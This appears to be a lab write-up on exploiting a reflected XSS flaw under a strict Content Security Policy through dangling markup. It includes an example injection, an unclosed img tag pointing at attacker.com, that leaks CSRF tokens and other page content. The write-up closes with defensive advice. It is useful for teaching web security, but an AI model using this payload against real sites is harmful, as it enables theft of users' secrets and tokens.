# Reflected XSS protected by very strict CSP, with dangling markup attack

### Goal -

Perform a reflected XSS attack that bypasses a very strict Content Security Policy using a dangling markup technique.

### Vulnerability / Concept

The application has a strict CSP that blocks inline scripts and most script sources. However, the CSP doesn't prevent HTML injection. Dangling markup can be used to exfiltrate data by capturing HTML content that follows the injection point.

### Exploitation

1. Identify that the CSP blocks JavaScript execution
2. Inject HTML that creates a dangling markup (e.g., `<img src='https://attacker.com/?`)
3. The unclosed attribute captures subsequent HTML content
4. The captured content (including CSRF tokens or secrets) is sent to the attacker's server

### Why It Works

CSP prevents script execution but doesn't prevent HTML injection. Dangling markup uses unclosed HTML attributes to capture content from the page. The browser sends everything up to the next matching quote character to the attacker's server via the image/script URL.

### Key Takeaways

- CSP alone is not sufficient to prevent all XSS impacts
- Use `Content-Security-Policy` with `object-src 'none'` and strict `img-src`
- Consider `Trusted Types` to prevent DOM-based injection
- Always sanitize HTML input even with CSP
